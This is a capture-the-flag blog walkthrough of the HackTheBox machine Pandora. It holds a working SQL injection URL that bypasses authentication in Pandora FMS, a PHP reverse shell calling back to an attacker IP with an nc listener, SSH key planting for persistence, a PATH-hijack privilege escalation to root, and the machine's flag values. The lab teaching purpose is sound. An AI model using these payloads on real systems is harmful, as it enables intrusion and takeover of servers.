---
title: "Walk-through of Pandora from HackTheBox"
header:
  teaser: /assets/images/2022-01-18-16-53-12.png
toc: true
toc_sticky: true
excerpt_separator:  <!--more-->
categories:
  - CTF
tags:
  - HTB
  - CTF
  - Linux
  - PandoraFMS
---

## Machine Information

![pandora](/assets/images/2022-01-19-17-04-21.png)

Pandora is an easy machine on HackTheBox. An initial website on port 80 reveals nothing, but enumeration of UDP ports exposes credentials for SSH. We find a binary that points us to a website running locally on the box, which we access via port tunneling. We gain admin access to Pandora FMS on the box via an exploit. From there we upload a reverse shell to gain access as a low level user. Enumeration finds another binary, this one uses an unquoted path to tar which it uses to back up the pandora site. We use this to get a root shell to complete the box.

<!--more-->

Skills required are basic web and OS enumeration. Skills learned are using public exploits, and tunneling traffic to access remote sites.

| Details |  |
| --- | --- |
| Hosting Site | [HackTheBox](https://www.hackthebox.eu) |
| Link To Machine | [HTB - Easy - Pandora](https://www.hackthebox.com/home/machines/profile/423) |
| Machine Release Date | 8th January 2022 |
| Date I Completed It | 20th January 2022 |
| Distribution Used | Kali 2021.3 – [Release Info](https://www.kali.org/blog/kali-linux-2021-3-release/) |

## Initial Recon

As always let's start with Nmap:

```sh
┌──(root💀kali)-[~/htb/pandora]
└─# ports=$(nmap -p- --min-rate=1000 -T4 10.10.11.136 | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)

┌──(root💀kali)-[~/htb/pandora]
└─# nmap -p$ports -sC -sV -oA pandora 10.10.11.136
Starting Nmap 7.92 ( https://nmap.org ) at 2022-01-19 20:54 GMT
Nmap scan report for 10.10.11.136
Host is up (0.030s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 24:c2:95:a5:c3:0b:3f:f3:17:3c:68:d7:af:2b:53:38 (RSA)
|   256 b1:41:77:99:46:9a:6c:5d:d2:98:2f:c0:32:9a:ce:03 (ECDSA)
|_  256 e7:36:43:3b:a9:47:8a:19:01:58:b2:bc:89:f6:51:08 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Play | Landing
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.81 seconds
```

Just a website on port 80 to look at to start with:

![pandora-website](/assets/images/2022-01-19-21-54-23.png)

Looking around we find it's a simple html site with nothing of interest. Next I did a quick scan of UDP ports:

```sh
┌──(root💀kali)-[~/htb/pandora]
└─# nmap -sU --top-ports=20 10.10.11.136
Starting Nmap 7.92 ( https://nmap.org ) at 2022-01-19 21:32 GMT
Nmap scan report for 10.10.11.136
Host is up (0.025s latency).

PORT      STATE         SERVICE
53/udp    closed        domain
67/udp    closed        dhcps
68/udp    closed        dhcpc
69/udp    closed        tftp
123/udp   open|filtered ntp
135/udp   open|filtered msrpc
137/udp   closed        netbios-ns
138/udp   closed        netbios-dgm
139/udp   closed        netbios-ssn
161/udp   open          snmp
162/udp   open|filtered snmptrap
445/udp   open|filtered microsoft-ds
500/udp   closed        isakmp
514/udp   open|filtered syslog
520/udp   open|filtered route
631/udp   closed        ipp
1434/udp  closed        ms-sql-m
1900/udp  open|filtered upnp
4500/udp  closed        nat-t-ike
49152/udp open|filtered unknown
Nmap done: 1 IP address (1 host up) scanned in 8.40 seconds
```

## SNMP

Port 161 which is SNMP is open, let's have a closer look at that:

```sh
┌──(root💀kali)-[~]
└─# nmap -sC -sV -sU -p161 10.10.11.136 
Starting Nmap 7.92 ( https://nmap.org ) at 2022-01-19 21:26 GMT
Nmap scan report for 10.10.11.136
Host is up (0.021s latency).

PORT    STATE SERVICE VERSION
161/udp open  snmp    SNMPv1 server; net-snmp SNMPv3 server (public)
| snmp-win32-software: 
|   accountsservice_0.6.55-0ubuntu12~20.04.5_amd64; 2021-12-07T12:57:21
|   adduser_3.118ubuntu2_all; 2021-02-01T17:21:32
|   alsa-topology-conf_1.2.2-1_all; 2021-02-01T17:25:18
|   alsa-ucm-conf_1.2.2-1ubuntu0.11_all; 2021-12-07T12:57:25
|   amd64-microcode_3.20191218.1ubuntu1_amd64; 2021-06-11T12:44:07
|   apache2-bin_2.4.41-4ubuntu3.8_amd64; 2021-12-07T12:57:07
|   apache2-data_2.4.41-4ubuntu3.8_all; 2021-12-07T12:57:07
|   apache2-utils_2.4.41-4ubuntu3.8_amd64; 2021-12-07T12:57:07
<SNIP>
|   837: 
|     Name: cron
|     Path: /usr/sbin/CRON
|     Params: -f
|   838: 
|     Name: sh
|     Path: /bin/sh
|     Params: -c sleep 30; /bin/bash -c '/usr/bin/host_check -u daniel -p <HIDDEN>'
<SNIP>
```

There was a long list returned but we see something interesting, a username and password have been leaked.

## SSH Access As Daniel

Trying these credentials on the SSH port we saw open works:

```text
┌──(root💀kali)-[~]
└─# ssh daniel@10.10.11.136                                          
daniel@10.10.11.136's password: 
Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-91-generic x86_64)
  System information as of Wed 19 Jan 21:34:26 UTC 2022
daniel@pandora:~$ 
```

We're in and a quick look at the passwd file shows there's another user called matt:

```text
daniel@pandora:~$ cat /etc/passwd | grep /bin/bash
root:x:0:0:root:/root:/bin/bash
matt:x:1000:1000:matt:/home/matt:/bin/bash
daniel:x:1001:1001::/home/daniel:/bin/bash
```

The user flag is owned by Matt so we can't get that yet:

```text
daniel@pandora:~$ ls -ls /home/matt/
4 -rw-r----- 1 root matt 33 Jan 19 17:08 user.txt
```

Looking at running processes shows the same long list we saw before:

```text
daniel@pandora:~$ ps -ef
UID          PID    PPID  C STIME TTY          TIME CMD
root           1       0  0 17:07 ?        00:00:03 /sbin/init maybe-ubiquity
root           2       0  0 17:07 ?        00:00:00 [kthreadd]
root           3       2  0 17:07 ?        00:00:00 [rcu_gp]
<SNIP>
root         835       1  0 17:07 ?        00:00:00 /usr/sbin/cron -f
root         837     835  0 17:07 ?        00:00:00 /usr/sbin/CRON -f
root         838     837  0 17:07 ?        00:00:00 /bin/sh -c sleep 30; /bin/bash -c '/usr/bin/host_check -u daniel -p <HIDDEN>'
daemon       860       1  0 17:07 ?        00:00:00 /usr/sbin/atd -f
Debian-+     863       1  0 17:07 ?        00:00:07 /usr/sbin/snmpd -LOw -u Debian-snmp -g Debian-snmp -I -smux mteTrigger mteTriggerConf -f -p /run/snmpd.pid
root         864       1  0 17:07 ?        00:00:00 sshd: /usr/sbin/sshd -D [listener] 0 of 10-100 startups
root         874       1  0 17:07 ?        00:00:00 /usr/sbin/apache2 -k start
root         941       1  0 17:07 tty1     00:00:00 /sbin/agetty -o -p -- \u --noclear tty1 linux
root         949       1  0 17:07 ?        00:00:00 /usr/lib/policykit-1/polkitd --no-debug
mysql        967       1  0 17:07 ?        00:00:12 /usr/sbin/mysqld
www-data    1048     874  0 17:07 ?        00:00:00 /usr/sbin/apache2 -k start
www-data    1049     874  0 17:07 ?        00:00:00 /usr/sbin/apache2 -k start
www-data    1050     874  0 17:07 ?        00:00:00 /usr/sbin/apache2 -k start
www-data    1051     874  0 17:07 ?        00:00:00 /usr/sbin/apache2 -k start
www-data    1052     874  0 17:07 ?        00:00:00 /usr/sbin/apache2 -k start
root        1119     838  0 17:08 ?        00:00:00 /usr/bin/host_check -u daniel -p <HIDDEN>
```

## Suspicious Binary

The file host_check is being run with those credentials we used to get in, let's have a look at that:

```text
daniel@pandora:~$ cat /usr/bin/host_check
ELF>�@:@8
H�=��(�����ÐAWL�=�+AVI��AUI��ATA��UH�-�+SL)�H������H��t�L��L��D��A��H��H9�u�H�[]A\A]A^A_��H�H��
PandoraFMS host check utilityNow attempting to check PandoraFMS registered hosts.Files will be saved to ~/.host_check/usr/bin/curl 
'http://127.0.0.1/pandora_console/include/api.php?op=get&op2=all_agents&return_type=csv&other_mode=url_encode_separator_%7C&user=daniel&pass='
> ~/.host_check 2>/dev/nullHost check unsuccessful!
Please check your credentials.
Terminating program!Host check successful!
Terminating program!Ussage: ./host_check -u username -p password.Two arguments expected.����X����h���XM���������X���0zRx
```

It's a binary file so the output from cat is messed up but we can see curl in there with a URL. We can try that on the box:

```text
daniel@pandora:~$ curl http://127.0.0.1/pandora_console/include/api.php?op=get&op2=all_agents&return_type=csv&other_mode=url_encode_separator_%7C&user=daniel&pass=HotelBabylon23
[1] 2406
[2] 2407
[3] 2408
[4] 2409
[5] 2410
daniel@pandora:~$ auth error
[1]   Done                    curl http://127.0.0.1/pandora_console/include/api.php?op=get
[2]   Done                    op2=all_agents
[3]   Done                    return_type=csv
[4]-  Done                    other_mode=url_encode_separator_%7C
[5]+  Done                    user=daniel
```

## Port Forwarding

Ok, I have no idea what it's doing! However there is something running on the loopback IP with what looks like a subfolder called pandora_console. We can use port forwarding like we have many times in the past, most recently on [Static](https://pencer.io/ctf/ctf-htb-static/#user-ssh-access):

```text
┌──(root💀kali)-[~]
└─# ssh -L 8000:127.0.0.1:80 daniel@10.10.11.136
daniel@10.10.11.136's password: 
Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-91-generic x86_64)
  System information as of Wed 19 Jan 21:52:09 UTC 2022
Last login: Wed Jan 19 21:34:27 2022 from 10.10.14.10
daniel@pandora:~$ 
```

Above is logging in to an SSH session on the box using the credentials for Daniel, but this time we're forwarding any traffic to our Kali port 8000 through the SSH tunnel to the box on port 80. Doing this we can use a web browser on Kali to access that website we've found on the box via SSH:

![pandora-console](/assets/images/2022-01-19-21-53-40.png)

## Pandora Console

Now we can access that console and we see something called Pandorea FMS. Clicking on the docs link top left takes us [here](https://pandorafms.com/manual). Also at the bottom of this landing page we see the version on the box is revealed as v7.0NG.742_FIX_PERL2020.

After a quick search I found [this](https://blog.sonarsource.com/pandora-fms-742-critical-code-vulnerabilities-explained) blog that shows a vulnerability in that version on Pandora. Looking up the CVE in there we find [this](https://github.com/ibnuuby/CVE-2021-32099) Github repo with a proof of concept to try.

It's simple enough, we just paste this in to our browser on Kali whilst we have our tunnel forwarding to the box:

```html
http://127.0.0.1:8000/pandora_console/include/chart_generator.php?session_id=a%27%20UNION%20SELECT%20%27a%27,1,%27id_usuario%7Cs:5:%22admin%22;%27%20as%20data%20FROM%20tsessions_php%20WHERE%20%271%27=%271
```

![pandora-sqli](/assets/images/2022-01-19-22-08-48.png)

In a new tab open the pandora_console again and now we have access as admin:

![pandora-console-admin](/assets/images/2022-01-19-22-09-18.png)

There's a lot to look around but eventually I found this File Manager section:

![pandora-file-manager](/assets/images/2022-01-19-22-14-08.png)

Which takes me to a list of files. Clicking the top right icon brings up this Upload Files box:

![pandora-upload-file](/assets/images/2022-01-19-22-15-51.png)

## Reverse Shell

Time for a reverse shell. Let's use one of the PHP shells already included on Kali:

```sh
┌──(root💀kali)-[~/htb/pandora]
└─# cp /usr/share/laudanum/php/php-reverse-shell.php .

┌──(root💀kali)-[~/htb/pandora]
└─# cat php-reverse-shell.php | grep '$ip'
$ip = '10.10.14.10';  // CHANGE THIS
```

All I've done is changed the IP to my current tun0. Switch back to the webpage and upload the file:

![pandora-upload-success](/assets/images/2022-01-19-22-16-52.png)

That works and scrolling down the long list of files we can find ours:

![pandora-shell-upload](/assets/images/2022-01-19-22-18-04.png)

Hovering over the files we can see a path in the URLs:

```html
http://127.0.0.1:8000/pandora_console/index.php?sec=gsetup&sec2=godmode/setup/file_manager&directory=images/backgrounds&hash2=764b0acce6acdb3e5ca2a6ebb646ec29
```

In there you can see it says directory=images. This is the path to the file we've uploaded, start a nc listening in another terminal then browse to the shell we uploaded:

![pandora-images-shell](/assets/images/2022-01-19-22-23-14.png)

Back to the terminal to see we're connected:

```text
┌──(root💀kali)-[~/htb/pandora]
└─# nc -nlvp 8888             
listening on [any] 8888 ...
connect to [10.10.14.10] from (UNKNOWN) [10.10.11.136] 55864
Linux pandora 5.4.0-91-generic #102-Ubuntu SMP Fri Nov 5 16:31:28 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux
$
```

First thing lets upgrade our shell:

```sh
$ python3 -c 'import pty;pty.spawn("/bin/bash")'
matt@pandora:/$ ^Z
zsh: suspended  nc -nlvp 8888
┌──(root💀kali)-[~/htb/pandora]
└─# stty raw -echo; fg
[1]  + continued  nc -nlvp 8888
matt@pandora:/$ export TERM=xterm
matt@pandora:/$ stty rows 51 cols 236
```

## User Flag

That's better. Now we can see we're in as Matt, let's grab the user flag:

```text
matt@pandora:/$ id
uid=1000(matt) gid=1000(matt) groups=1000(matt)

matt@pandora:/$ cat /home/matt/user.txt 
6de8401da164b118c4bbad8549bde0d1
```

## Pandora Backup

A look around found an interesting file:

```text
matt@pandora:/$ find / -perm -4000 2>/dev/null
<SNIP>
/usr/bin/gpasswd
/usr/bin/umount
/usr/bin/pandora_backup
/usr/bin/passwd
/usr/bin/mount
/usr/bin/su
<SNIP>
```

What is pandora_backup?

```text
matt@pandora:/$ ls -lsa /usr/bin/pandora_backup 
20 -rwsr-x--- 1 root matt 16816 Dec  3 15:58 /usr/bin/pandora_backup
```

Not sure, let's see what it does:

```text
matt@pandora:/$ /usr/bin/pandora_backup
PandoraFMS Backup Utility
Now attempting to backup PandoraFMS client
tar: /root/.backup/pandora-backup.tar.gz: Cannot open: Permission denied
tar: Error is not recoverable: exiting now
Backup failed!
Check your permissions!
```

It doesn't seem to work. Looking inside it with cat reveals it's another binary, and we can see it's using tar to backup the pandora installation to a folder in root:

```text
matt@pandora:/$ cat /usr/bin/pandora_backup
ELF>�@0:@8
          @@@@h���HHmm   HH�-�=�=hp�-�=�=����DDP�td� � � <<Q�tdR�td�-�=�=▒▒/lib64/ld-linux-x86-64.so.2GNUqtðG7�%H9�
<SNIP>
tar -cvf /root/.backup/pandora-backup.tar.gz /var/www/pandora/pandora_console/*Backup failed!
Check your permissions!Backup successful!Terminating program!<(�������������X}�������h���8zRx
```

## SSH Access As Matt

After a fruitless play around I eventually decided to drop out of this reverse shell and use a proper SSH session. First create a new key pair on Kali:

```sh
┌──(root💀kali)-[~/htb/pandora]
└─# ssh-keygen
Generating public/private rsa key pair.
Enter file in which to save the key (/root/.ssh/id_rsa): /root/htb/pandora/id_rsa
Enter passphrase (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in /root/htb/pandora/id_rsa
Your public key has been saved in /root/htb/pandora/id_rsa.pub
The key fingerprint is:
SHA256:sJrMlhq6+lBuOaxgeVcKujv75rGInYGSf1A2GHa2fXY root@kali
The key's randomart image is:
+---[RSA 3072]----+
|                 |
|  o o            |
| . = o.          |
|  . = .oo E      |
|  .+ ..+S.       |
| *++.+o          |
|*+O+Bo           |
|=O+O=            |
|BB&=             |
+----[SHA256]-----+
```

Don't forget to change permissions:

```sh
┌──(root💀kali)-[~/htb/pandora]
└─# chmod 600 id_rsa
```

Copy the public key to the clipboard:

```sh
┌──(root💀kali)-[~/htb/pandora]
└─# cat id_rsa.pub 
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDoUK0S9FLwAzcvY5zWa70acZ/CWevVuxj3zIfjhFjZnklGvsCpFxTK124kVy8htLciaaP25f+14g2cD65Ao5DOJQclwI7h8oEXk879NvwDhBnqTt6S+OXn44XPIFvt9cdpaaxDDMZkRrh0mHtC9XVnTk0d/Sq61afh5/k9MozSJpvX55et2p/+Hj7Mk77q/zK2/Nt4MFtNogwlVd9ArQgOiyljKpG1Byjb/IYOssbdhgV1rgqoSVInXgWUeoXZmSpkmzK/W5wQ6sCkRBBmnHe8aLsZr++5YDZM9M8yuO1HxMK0KhSl5xrjvwBp7f8+PLt9DR+vmgiHxz5JUIPu1lOFrBxjozM5oXA4WBvmDFzJH+B4Ti0PJNA2qMCXO8SNFk06+tkkxHZ4tBRhpTpaESKafeFzlIamGIA9xKlL9bxfPhHKwAHVEo8Emopj4foaf8ho3Cy7u5/69s0p1DWZ1bAED367C0QbF5GmvsI/9Zny03badPLt17O558foH9+RfOE= root@kali
```

Back on the box make the .ssh folder in Matts home directory:

```text
matt@pandora:/home/matt$ mkdir .ssh
```

Now paste that public key from Kali on to the box and save to authorized_keys:

```text
matt@pandora:/home/matt$ echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDoUK0S9FLwAzcvY5zWa70acZ/CWevVuxj3zIfjhFjZnklGvsCpFxTK124kVy8htLciaaP25f+14g2cD65Ao5DOJQclwI7h8oEXk879NvwDhBnqTt6S+OXn44XPIFvt9cdpaaxDDMZkRrh0mHtC9XVnTk0d/Sq61afh5/k9MozSJpvX55et2p/+Hj7Mk77q/zK2/Nt4MFtNogwlVd9ArQgOiyljKpG1Byjb/IYOssbdhgV1rgqoSVInXgWUeoXZmSpkmzK/W5wQ6sCkRBBmnHe8aLsZr++5YDZM9M8yuO1HxMK0KhSl5xrjvwBp7f8+PLt9DR+vmgiHxz5JUIPu1lOFrBxjozM5oXA4WBvmDFzJH+B4Ti0PJNA2qMCXO8SNFk06+tkkxHZ4tBRhpTpaESKafeFzlIamGIA9xKlL9bxfPhHKwAHVEo8Emopj4foaf8ho3Cy7u5/69s0p1DWZ1bAED367C0QbF5GmvsI/9Zny03badPLt17O558foH9+RfOE= root@kali" > .ssh/authorized_keys
```

Don't forget to change permissions:

```text
matt@pandora:/home/matt$ chmod -R 600 .ssh/
```

Now we can log in via SSH as Matt using our keys:

```text
┌──(root💀kali)-[~/htb/pandora]
└─# ssh -i id_rsa matt@10.10.11.136
Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-91-generic x86_64)
ystem information as of Wed 19 Jan 22:51:24 UTC 2022
matt@pandora:~$
```

This time when we run the backup it works:

```text
matt@pandora:~$ /usr/bin/pandora_backup
PandoraFMS Backup Utility
Now attempting to backup PandoraFMS client
tar: Removing leading `/' from member names
/var/www/pandora/pandora_console/AUTHORS
tar: Removing leading `/' from hard link targets
/var/www/pandora/pandora_console/COPYING
/var/www/pandora/pandora_console/DB_Dockerfile
/var/www/pandora/pandora_console/DEBIAN/
/var/www/pandora/pandora_console/DEBIAN/md5sums
/var/www/pandora/pandora_console/DEBIAN/conffiles
/var/www/pandora/pandora_console/DEBIAN/control
<SNIP>
/var/www/pandora/pandora_console/vendor/egulias/email-validator/EmailValidator/Validation/MultipleErrors.php
/var/www/pandora/pandora_console/vendor/egulias/email-validator/EmailValidator/Validation/EmailValidation.php
/var/www/pandora/pandora_console/vendor/egulias/email-validator/EmailValidator/Validation/DNSCheckValidation.php
/var/www/pandora/pandora_console/vendor/egulias/email-validator/EmailValidator/EmailParser.php
/var/www/pandora/pandora_console/vendor/egulias/email-validator/EmailValidator/EmailValidator.php
/var/www/pandora/pandora_console/vendor/egulias/email-validator/README.md
/var/www/pandora/pandora_console/vendor/egulias/email-validator/composer.json
/var/www/pandora/pandora_console/vendor/egulias/email-validator/phpunit.xml.dist
/var/www/pandora/pandora_console/vendor/egulias/email-validator/LICENSE
/var/www/pandora/pandora_console/ws.php
Backup successful!
Terminating program!
```

## Privilege Escalation

Now we can take advantage of that unquoted path to tar that we saw when looking in the backup program.

Just create our own file called tar which calls bash and make it executable:

```text
matt@pandora:~$ echo '/bin/bash;' > tar
matt@pandora:~$ chmod +x tar
```

Add this folder to $PATH at the start so our version of tar is used instead of the correct one:

```text
matt@pandora:~$ export PATH=/home/matt:$PATH
matt@pandora:~$ $PATH
-bash: /home/matt:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin: No such file or directory
```

With /home/matt at the start of the path the backup program will use tar in there instead. Run the backup again:

```text
matt@pandora:~$ /usr/bin/pandora_backup
PandoraFMS Backup Utility
Now attempting to backup PandoraFMS client
root@pandora:~#
```

## Root Flag

It stops before doing anything and we are at a root prompt. Let's grab the flag:

```text
root@pandora:~# id
uid=0(root) gid=1000(matt) groups=1000(matt)
root@pandora:~# cat /root/root.txt
4bfc0ffaf379e65d41adb3f0f3b9144a
```

All done. Hope you enjoyed this box, see you next time.
